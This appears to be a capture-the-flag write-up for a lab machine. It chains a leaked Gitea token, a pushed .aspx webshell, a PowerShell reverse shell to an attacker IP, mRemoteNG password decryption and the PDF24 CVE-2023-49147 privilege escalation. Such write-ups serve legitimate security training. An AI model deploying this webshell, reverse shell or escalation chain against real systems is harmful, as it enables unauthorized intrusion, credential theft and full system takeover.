### Gitea enumeration

Since Gitea is publicly reachable and often misconfigured to allow anonymous browsing of repositories and commit history, the first thing to check is whether any public repos or user profiles are exposed without authentication.

Browsing around the instance, a folder structure becomes visible.

![alt text](/assets/img/posts/lock/image-2.png)

Going through the commit history of one of the repos turns up something interesting.

![alt text](/assets/img/posts/lock/image-3.png)

A commit contains a hardcoded `PERSONAL_ACCESS_TOKEN`, which was clearly meant to be removed before pushing but got committed anyway.

![alt text](/assets/img/posts/lock/image-4.png)

Gitea PATs are 40-character hex tokens (`Authorization: token <PAT>`), independent from the login form and its CSRF-protected flow. Instead of trying to brute-force or reuse the login endpoint, the token itself is enough to authenticate directly against the API.

```
curl -s -H "Authorization: token 43ce39bb0bd6bc489284f2905f033ca467a6362f" \
  http://10.129.234.64:3000/api/v1/user
```

The token is valid and belongs to `ellen.freeman`.

![alt text](/assets/img/posts/lock/image-5.png)

Checking which repositories this token can access:

```
curl -s -H "Authorization: token 43ce39bb0bd6bc489284f2905f033ca467a6362f" \
  http://10.129.234.64:3000/api/v1/repos/search?limit=50 | jq '.data[] | {name, full_name, permissions}'
```

![alt text](/assets/img/posts/lock/image-6.png)

Two repos show up, `dev-scripts` and `website`, both with `push` and `admin` permissions for ellen. The name `website` immediately stands out as the likely source for whatever IIS is serving on port 80.

## Exploitation

The plan is straightforward: if `website` is the repo being served by IIS, and we have push access to it, pushing a `.aspx` webshell into it should let us execute code on the box once it gets picked up by the web server, assuming ASP.NET handler mapping is active on IIS (which is the default on Windows Server web roles).

Before pushing anything blindly, it's worth checking how the repo actually reaches the server. Listing the repo's webhooks:

```
curl -s -H "Authorization: token 43ce39bb0bd6bc489284f2905f033ca467a6362f" \
  http://10.129.234.64:3000/api/v1/repos/ellen.freeman/website/hooks | jq
```

comes back empty, so there's no webhook-based deployment. Looking at `dev-scripts` to see if there's a deploy script or sync mechanism only turns up a small utility (`repos.py`) that just lists repositories via the API, nothing related to deployment. Since the sync mechanism isn't visible from Gitea's side, it's most likely a scheduled task or cron job on the Windows host doing a periodic `git pull`, invisible from here. Rather than spend more time reverse-engineering the deploy pipeline, the fastest way to confirm is to just push a webshell and check.

Cloning the repo using the token in the URL:

```
git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
cd website
```

The repo turns out to be a static Bootstrap template, no `.aspx` files anywhere. That doesn't matter for the exploit though, IIS will still execute any `.aspx` file dropped in, static template or not.

**Step 1 - webshell**

```
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!String.IsNullOrEmpty(cmd))
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            Process p = Process.Start(psi);
            Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + "</pre>");
        }
    }
</script>
```

**Step 2 - push it**

```
git add shell.aspx
git commit -m "test"
git push origin main
```

**Step 3 - trigger it**

After giving the sync mechanism a bit of time, the shell responds on port 80 and returns RCE.

![alt text](/assets/img/posts/lock/image-7.png)

### Getting a shell

Command execution through a URL parameter is workable but not comfortable for anything beyond one-off commands, so the next step is a proper reverse shell. Since this is Windows without netcat by default, PowerShell is the natural choice.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.134',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbackByte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbackByte,0,$sendbackByte.Length);$stream.Flush()};$client.Close()
```

PowerShell's `-enc` flag expects the payload as Base64-encoded UTF-16LE, so:

```
echo -n 'PAYLOAD' | iconv -t utf-16le | base64 -w 0
```

The resulting blob is passed as the `cmd` parameter (`powershell -enc <b64>`), URL-encoded, through Burp Repeater.

## Privilege Escalation

### Local enumeration

With a stable shell as `ellen.freeman`, the next step is manual enumeration of the home directory and any config files lying around. Inside `ellen.freeman`'s Documents folder, there's an mRemoteNG configuration file.

```
PS C:\Users\ellen.freeman\Documents> cat config.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" ... />
</mrng:Connections>
```

mRemoteNG stores connection passwords encrypted with AES, and the ciphertext for `Gale.Dekarios` is right there:

```
Gale.Dekarios:TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==
```

The `KdfIterations="1000"` and `BlockCipherMode="GCM"` attributes in the header indicate this is a modern mRemoteNG build using AES-GCM with PBKDF2-HMAC-SHA1 key derivation (older versions used AES-CBC with a plain MD5-derived key instead). The known public decryptors for this format (`mremoteng_decrypt.py`) expect a master password, which by default is the hardcoded string `mR3m` unless the user set a custom one. Running the `Protected` field from the header through the decryptor with the default password confirms it as a valid verification string, meaning no custom master password was ever set. With that confirmed, decrypting the actual connection password gives:

```
Gale.Dekarios:ty8wnW9qCKDosXo6
```

### PDF24 Creator LPE

Once inside the graphical session, PDF24 is sitting on the desktop, an outdated version vulnerable to a known local privilege escalation via its MSI installer's repair function (CVE-2023-49147).

PoC: https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/

The root cause is that `msiexec.exe /fa` (repair) spawns `pdf24-PrinterInstall.exe` as SYSTEM, which writes to `C:\Program Files\PDF24\faxPrnInst.log` in a visible `cmd.exe` window. Setting an oplock on that log file right before the repair reaches that point causes the write to block, leaving the SYSTEM `cmd.exe` window open and unresponsive instead of closing immediately. From there, abusing the console properties dialog (which is not privilege-aware) makes it possible to spawn an arbitrary process, including a new `cmd.exe`, inheriting SYSTEM rights.

The vulnerable MSI installer is already present on disk.

![alt text](/assets/img/posts/lock/image-10.png)

`SetOpLock.exe`, from Google Project Zero's `symboliclink-testing-tools`, is the tool used to set the oplock on the target log file:

```
.\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

With the oplock armed and waiting, the repair is triggered:

```
msiexec.exe /fa "C:\_install\pdf24-creator-11.15.1-x64.msi"
```

![alt text](/assets/img/posts/lock/image-12.png)

Once the repair process hits the log write, it hangs and a `cmd.exe` window stays open on screen instead of disappearing.

![alt text](/assets/img/posts/lock/image-15.png)

Right-clicking the title bar of that stuck window and opening Properties:

![alt text](/assets/img/posts/lock/image-16.png)

Under Options, enabling "Use legacy console" and then clicking the "legacy console mode" link opens a browser link. Selecting Firefox (not Edge/IE, both of which refuse to run elevated on this build), pressing Ctrl+O in the opened window and typing `cmd.exe` spawns a new console.

![alt text](/assets/img/posts/lock/image-13.png)

That new console inherits the privileges of the process that opened it, which in this case is the SYSTEM process stuck behind the oplock.

![alt text](/assets/img/posts/lock/image-14.png)
